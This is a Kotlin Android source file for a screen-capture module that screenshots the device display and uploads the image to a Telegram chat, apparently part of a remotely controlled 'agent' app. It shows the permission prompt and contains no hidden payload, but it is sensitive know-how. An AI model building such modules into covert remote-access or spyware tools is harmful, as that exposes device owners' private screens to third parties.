package com.example.agent.capabilities

import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.Image
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Handler
import android.os.Looper
import androidx.core.content.ContextCompat
import com.example.agent.TelegramClient
import com.example.agent.ErrorReporter
import java.io.File
import java.nio.ByteBuffer

class ScreenCapability(
    private val ctx: Context,
    private val telegram: TelegramClient
) {
    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private val mainHandler = Handler(Looper.getMainLooper())

    fun capture() {
        if (mediaProjection == null) {
            requestMediaProjection()
            return
        }
        takeScreenshot()
    }

    private fun requestMediaProjection() {
        try {
            val intent = Intent(ctx, ScreenCaptureActivity::class.java)
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            ctx.startActivity(intent)
            telegram.sendText("📸 Starting screen capture...\n(Accept the permission prompt)")
        } catch (e: Exception) {
            telegram.sendText("❌ Cannot start screen capture: ${e.message}")
            ErrorReporter.report(e, "ScreenCapability")
        }
    }

    fun onProjectionReady(projection: MediaProjection) {
        mediaProjection = projection
        takeScreenshot()
    }

    private fun takeScreenshot() {
        val projection = mediaProjection ?: run {
            telegram.sendText("❌ MediaProjection not ready")
            return
        }

        val metrics = ctx.resources.displayMetrics
        val width = metrics.widthPixels
        val height = metrics.heightPixels
        val density = metrics.densityDpi

        val imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 1)
        virtualDisplay = projection.createVirtualDisplay(
            "ScreenCapture",
            width, height, density,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            imageReader.surface, null, null
        )

        mainHandler.postDelayed({
            try {
                val image = imageReader.acquireLatestImage()
                if (image != null) {
                    val bitmap = imageToBitmap(image)
                    image.close()

                    if (bitmap != null) {
                        val file = File(ctx.cacheDir, "screenshot_${System.currentTimeMillis()}.png")
                        file.outputStream().use { out ->
                            bitmap.compress(Bitmap.CompressFormat.PNG, 100, out)
                        }
                        telegram.sendPhoto(file, "📸 Screenshot")
                        file.delete()
                    } else {
                        telegram.sendText("❌ Failed to convert screenshot")
                    }
                } else {
                    telegram.sendText("❌ No screenshot data")
                }
             } catch (e: Exception) {
                telegram.sendText("❌ Screenshot error: ${e.message}")
                ErrorReporter.report(e, "ScreenCapability")
            } finally {
                try { virtualDisplay?.release() } catch (_: Exception) {}
                try { imageReader.close() } catch (_: Exception) {}
            }
        }, 500)
    }

    private fun imageToBitmap(image: Image): Bitmap? {
        try {
            val planes = image.planes
            val buffer: ByteBuffer = planes[0].buffer
            val pixelStride = planes[0].pixelStride
            val rowStride = planes[0].rowStride
            val rowPadding = rowStride - pixelStride * image.width

            val bitmap = Bitmap.createBitmap(
                image.width + rowPadding / pixelStride,
                image.height,
                Bitmap.Config.ARGB_8888
            )
            bitmap.copyPixelsFromBuffer(buffer)
            return Bitmap.createBitmap(bitmap, 0, 0, image.width, image.height)
        } catch (e: Exception) {
            return null
        }
    }

    fun release() {
        virtualDisplay?.release()
        mediaProjection?.stop()
        mediaProjection = null
    }
}
